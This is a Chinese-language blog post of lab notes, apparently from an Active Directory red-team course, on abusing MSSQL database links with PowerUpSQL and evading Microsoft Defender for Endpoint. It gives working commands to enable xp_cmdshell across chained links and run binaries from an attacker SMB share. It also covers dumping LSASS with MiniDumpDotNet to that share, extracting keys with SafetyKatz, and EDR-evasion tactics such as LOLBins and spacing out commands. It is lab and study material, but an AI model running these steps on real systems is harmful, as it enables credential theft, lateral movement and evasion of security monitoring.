+<p><a target="_blank" rel="noopener" href="https://github.com/NetSPl/PowerUpSQL">https://github.com/NetSPl/PowerUpSQL</a></p>
+</blockquote>
+<p>在拿到一个数据库的时候按理说应该更关注数据库的数据（笑</p>
+<p>通过SPN枚举发现sql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain</span><br></pre></td></tr></table></figure>
+
+<p>连接尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLConnectionTestThreaded</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose</span><br></pre></td></tr></table></figure>
+
+<p>获取server信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-存在利用点"><a href="#1-存在利用点" class="headerlink" title="1.存在利用点"></a>1.存在利用点</h3><p><code>database link</code>，在当前数据库中可能会有到另一个数据库的链接，而这个到另一个数据库的链接可能会是一个高权用户的。</p>
+<p>而且在多个数据库串到一起的情况下危害可能更大，比如这里的例子。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">普通用户-&gt;数据库A---&gt;link database admin---&gt;数据库b ---&gt;link database As---&gt;数据库C</span><br></pre></td></tr></table></figure>
+
+<p>而且即便是跨林，林的安全边界对于这种情况毫无影响。</p>
+<p>查询数据库链接的方式</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-SQLServerLink</span> <span class="literal">-Instance</span> dcorp<span class="literal">-mssal</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>
+
+<p>或者直接查</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> master..sysservers</span><br></pre></td></tr></table></figure>
+
+<p>查到了的话就可以通过语句指定链接名狠狠的查对面数据库有没有link</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span> openquery(&quot;dcorp-sql1&quot;,<span class="string">&#x27;select * from master..sysservers&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后再套娃查（注意转义单引号）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> openquery(&quot;dcorp-sql1&quot;,<span class="string">&#x27;select * from openquery(&quot;dcorpmgmt&quot;,&quot;select * from master..sysservers&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>如果不想手动套娃的话可以用，PowerUpSQL这个函数，让他自动套娃查</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-SQLServerLinkCrawl</span> <span class="literal">-Instance</span> dcorp<span class="literal">-mssql</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>
+
+<p>数据库链接时候访问链接对面库的密码会在本地。</p>
+<p><strong>执行命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE(&#x27;sp_configure &quot;xp_cmdshell&quot;,1;reconfigure;&#x27;) AT &quot;eu-sql&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在手动套娃的情况下执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> openquery(&quot;dcorp-sql1&quot;,<span class="string">&#x27;select * from openquery(&quot;dcorp-mgmt&quot;,&quot;select * from openquery(&quot;eu-sql.eu.eurocorp.local&quot;,&quot;&#x27;</span><span class="keyword">select</span> @<span class="variable">@version</span> <span class="keyword">as</span> version;<span class="keyword">exec</span> master..xp cmdshell &quot;powershell whoami)&#x27;&#x27;&#x27;&#x27;)&quot;)<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>还是自动套娃执行吧（如果不指定<code>-QueryTarget</code>参数他将在所有database的link节点都执行这个）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-SQLserverLinkcrawl</span> <span class="literal">-Instance</span> dcorp<span class="literal">-mssql</span> <span class="literal">-Query</span> <span class="string">&quot;exec master..xp_cmdshell &#x27;whoami&#x27;&quot;</span> <span class="literal">-QueryTarget</span> eu<span class="literal">-sql</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="12-MDE"><a href="#12-MDE" class="headerlink" title="12.MDE"></a>12.MDE</h2><h3 id="minidump"><a href="#minidump" class="headerlink" title="minidump"></a>minidump</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/WhiteOakSecurity/MiniDumpDotNet">https://github.com/WhiteOakSecurity/MiniDumpDotNet</a></p>
+</blockquote>
+<p>通过自定义的API来实现minidump，从而来对MDE进行绕过</p>
+<p>这个工具需要lsass的pid，那如何获取lsass的pid。</p>
+<p><code>tasklist /v</code> 是不行了，mde会检测这个命令并告警。</p>
+<p>建议用winapi来实现，或者如果有RDP的话用任务管理器也ok。</p>
+<p>当然如果直接把把这个查询pid的功能集成到minidumpdotnet中，mde将会告警。</p>
+<p>所以他必须作为一个独立的exe或者别的而存在。</p>
+<h3 id="工具传输落地"><a href="#工具传输落地" class="headerlink" title="工具传输落地"></a>工具传输落地</h3><p>很多 EDR 会监控网络下载行为，特别是从 Internet 上下载 .exe、.dll、.bat 这类可疑文件，风险很高。</p>
+<p>利用系统自带的“合法软件”下载东西，比如 msedge.exe、bitsadmin、certutil，可以绕过很多 EDR 的规则（叫 LOLBins —— Living Off the Land Binaries）。</p>
+<p>另一个安全性更高（隐蔽性更好）的方式是使用 SMB 文件共享。可以直接从一个可读取的共享目录中运行程序，这比传统的下载并执行方式风险小很多。</p>
+<p>比如把文件放在某个 SMB 共享（如攻击者自己的共享目录），然后目标机器可以通过 \attacker\share\tool.exe 来直接访问甚至运行。</p>
+<p>这样不会产生明显的网络下载行为，也避开很多流量监控系统。</p>
+<h3 id="打破检测链"><a href="#打破检测链" class="headerlink" title="打破检测链"></a>打破检测链</h3><p>如果在一条条执行可疑命令，将会逐渐降低当前edr对你的可信度。</p>
+<p>建议是执行一条可疑的命令之后来点正常的命令。</p>
+<p>或者每次执行间隔时间长一些，比如10分钟左右再进行下一次。</p>
+<h3 id="ASR绕过"><a href="#ASR绕过" class="headerlink" title="ASR绕过"></a>ASR绕过</h3><p>通过<code>GetCommandLineExclusions</code>查看被排除的关键字，只要命令行里有这里面包含的关键字，就可以绕过，或者命令行伪装路径</p>
+<p>避免执行whoami这样的命令 都会被edr捕获到。</p>
+<h3 id="重新做一遍11-sqlserver，采用基于opsec绕过mde的做法"><a href="#重新做一遍11-sqlserver，采用基于opsec绕过mde的做法" class="headerlink" title="重新做一遍11.sqlserver，采用基于opsec绕过mde的做法"></a>重新做一遍11.sqlserver，采用基于opsec绕过mde的做法</h3><p>把 <code>findlsasspid.exe</code> 放到smb的目录共享中。</p>
+<p>然后在目标机器上通过smb直接执行exe，获取到lsass的pid</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-SQLserverLinkcrawl</span> <span class="literal">-Instance</span> dcorp<span class="literal">-mssql</span> <span class="literal">-Query</span> <span class="string">&quot;exec master..xp_cmdshell &#x27;\\dcorp-student1.dollarcorp.moneycorp.local\FindLassPid.exe&#x27;&quot;</span> <span class="literal">-QueryTarget</span> eu<span class="literal">-sql</span></span><br></pre></td></tr></table></figure>
+
+<p>再执行一个相对正常的命令，尝试打破mde的检测链</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-SQLserverLinkcrawl</span> <span class="literal">-Instance</span> dcorp<span class="literal">-mssql</span> <span class="literal">-Query</span> <span class="string">&#x27;select @@version&#x27;</span> <span class="literal">-QueryTarget</span> eu<span class="literal">-sql</span></span><br></pre></td></tr></table></figure>
+
+<p>然后进行提取，并将dump出的dmp放到我们的smb下</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-SQLserverLinkcrawl</span> <span class="literal">-Instance</span> dcorp<span class="literal">-mssql</span> <span class="literal">-Query</span> <span class="string">&#x27;exec master..xp_cmdshell &#x27;</span><span class="string">&#x27;\\dcorp-student1.dollarcorp.moneycorp.local\minidumpdotnet.exe 696 \\dcorp-student1.dollarcorp.moneycorp.local\test.dmp&#x27;</span><span class="string">&#x27; &#x27;</span> <span class="literal">-QueryTarget</span> eu<span class="literal">-sql</span></span><br></pre></td></tr></table></figure>
+
+<p>得到dmp后就可以在本地加载dmp了</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safetykatz.exe <span class="string">&quot;sekurlsa::minidump C:\tools\ad\test.dmp&quot;</span> <span class="string">&quot;sekurlsa::evasive-ekeys&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
         
       </div>
       
